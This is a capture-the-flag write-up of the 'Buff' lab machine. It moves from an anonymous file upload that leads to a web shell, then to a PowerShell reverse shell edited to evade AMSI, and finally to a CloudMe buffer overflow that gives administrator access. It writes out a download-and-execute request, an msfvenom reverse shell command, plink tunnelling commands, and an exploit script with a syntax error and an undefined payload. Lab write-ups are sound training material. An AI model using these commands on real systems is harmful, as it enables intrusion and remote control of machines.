## Overview

Buff is a Windows 10 box running XAMPP thats hosts a site offering fitness packages that allowed anonymous upload and bypass of file upload filtering. From here I uploaded a web shell that was used to create a reverse shell for the initial foothold. A buffer overflow in an application called CloudMe allowed for privilege escalation to administrator.

## Steps (User)

I started by browsing to the site hosted on port 8080 and was presented with web page titled "mrb3n's Bro Hut" that sells fitness packages.

After reviewing the Gobuster results and poking around the websiet I did not find anything interesting. I was grasping at straws but I noticed the contact form showed that the site was using Gym Management Software 1.0, so I decided to look it up in exploit-db and found an exploit for it. 

![2021-08-31_17-01.png](/home/sixstringacks/share/git/tmp_assets/2e3b716da89701eaaee9a8c09637620f21cffa9d.png)

I reviewed the [exploit](https://www.exploit-db.com/exploits/48506) to figure out what it was doing; basically the site allows for files to be uploaded anonymously and for its file upload filtering to be bypassed. I decided to use burp instead so I created a post request and uploaded my own web shell (using my own, easier to type, parameter names). 

```

Command execution

![2021-08-30_13-42_1.png](/home/sixstringacks/share/git/tmp_assets/3d8414508b93585443c020b23bf5593ff9507b66.png)

Now that I had command execution I could try for a reverse shell. I went with Nishang's Invoke-PowerShellTcp.ps1 script. To prevent AMSI from blocking it I removed the comments, changed the name of the function to ipst, and added a function all at the bottom of the script so it would get executed immediately. 

![2021-08-31_17-15.png](/home/sixstringacks/share/git/tmp_assets/e3ac5364fcc7bee2712534b74e4131972134d994.png)

I started a netcat listener, a simple python http server to host ipst.ps1 and used the webshell to execute Powershell Invoke-Expression, specifying the url to ipst.ps1 and received a call back and shell as user "shaun"

```
GET /upload/shell.php?cmd=powershell+-nop+-exec+bypass+-c+"IEX+(New-Object+Net.WebClient).DownloadString('http%3a//10.10.14.7/ipst.ps1')%3bipst.ps1" HTTP/1.1

## Steps (root/system)

I went into a bit of a rabbit hole here, while enumerating the file system I found a file called "new text document.txt" that contained mysql credentials

![2021-08-30_17-04.png](/home/sixstringacks/share/git/tmp_assets/251c6da3f67418f6e061ca3c9554d1e88fee208e.png)

Running a netstat I noticed that the mysql server was running on 3306, but was only accessible to local host. I uploaded plink.exe to the machine so I could create a reverse port forward and access the port from my machine. I was able to connet to mysql with root and no password but there was nothing useful there.

```
echo y | .\plink.exe -ssh -l **** -pw "****" -P 2222 -R 8889:127.0.0.1:3306 10.10.14.7
```

Later I came across en executable in the Downloads folder called CloudMe_1112.exe, and cofirmed that a service was running under the same name. I searched for informaton about it and learned that it was some sort of a file sharing and syncronization app, and it runs on the local machine on port 8888. Once again this was only accessible from localhost but I felt like I was finally on the right track.

![2021-08-31_17-34.png](/home/sixstringacks/share/git/tmp_assets/5deaa7e25087785a2c92e8cdfffc1f651c292890.png)

I searched for Cloudme exploits and there were quite a few. Before I could start testing exploits I needed a connection to port 8888. I fired up plink again and this time I forwarded local port 8888 to my box.

```
echo y | .\plink.exe -ssh -l **** -pw "****" -P 2222 -R 9001:127.0.0.1:8888 10.10.14.7
```

There was quite a bit of trial an error involved in creating a working exploit for this. Some of the older ones on exploit-db.com were not working so I settled on [48389](https://www.exploit-db.com/exploits/48389) to use as a starting point because it was released a little closer to when the box was created. 

I used msfvenom for generating the payload in python format

```
msfvenom -a x86 -p windows/shell_reverse_tcp -b '\x00\x0A\x0D' lhost=10.10.14.7 lport=4201 -f python 
```

I updated the script with the payload, making sure the right port (9001) was set.

```
import socket
import sys

target = "127.0.0.1"

buf = \x90" * 1052
ret = "\xb5\x42\xa8\x68"
nopsled = "\x90"*30 # NOP sled

exploit = buf + ret + nopsled + payload

try:
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,9001))
    s.send(exploit)

except Exception as e:
    print(sys.exc_value)
```

With plink remote port forwarding port 9001, the exploit ready to go, and a netcat listener started I ran the script and received a shell as administrator with access to the root flag.
